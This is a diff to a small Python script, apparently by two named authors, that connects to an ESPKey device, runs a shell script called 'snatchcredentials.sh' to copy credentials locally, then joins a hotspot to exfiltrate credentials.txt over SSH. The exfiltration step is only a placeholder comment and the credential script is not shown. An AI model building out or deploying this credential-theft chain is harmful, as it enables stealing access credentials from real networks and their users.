@@ -1,5 +1,6 @@
 from wireless import Wireless
 import os
+import subprocess
 import time
 # By Thomas McLaughlin and Roman Morasco
 
@@ -16,6 +17,10 @@ def connectEspKey():
             isConnected = True
     print("Connection Established")
 
+def credentialsLocalFile():
+    filename = "snatchcredentials.sh"
+    subprocess.run(["bash", filename])
+
 def connectInternet():
     hostname = "google.com"
     isConnected = False
@@ -29,14 +34,20 @@ def connectInternet():
             isConnected = True
     print("Connection Established")   
 
+def exfiltrateFile():
+    placeholder = "placeholder"
+    #process to exfiltrate credentials.txt to external device from network
 
 def main():
     time.sleep(0)# increase to around 30 to allow computer to start up
     print("STARTING INITIAL CONNECTION")
-    connectEspKey()
+    connectEspKey() # connect to ESPKEY
+    print("SAVING CREDENTIALS LOCALLY")
+    credentialsLocalFile() # make a local copy of credentials
     print("STARTING SECOND CONNECTION")
-    connectInternet()
+    connectInternet() # connect to hotspot to exfiltrate local file
+    print("EXFILTRATING FILE TO EXTERNAL")
+    exfiltrateFile() # SSH'ing to device outside of network and transfering credentials.txt file
 
-  
 if __name__=="__main__":
     main()
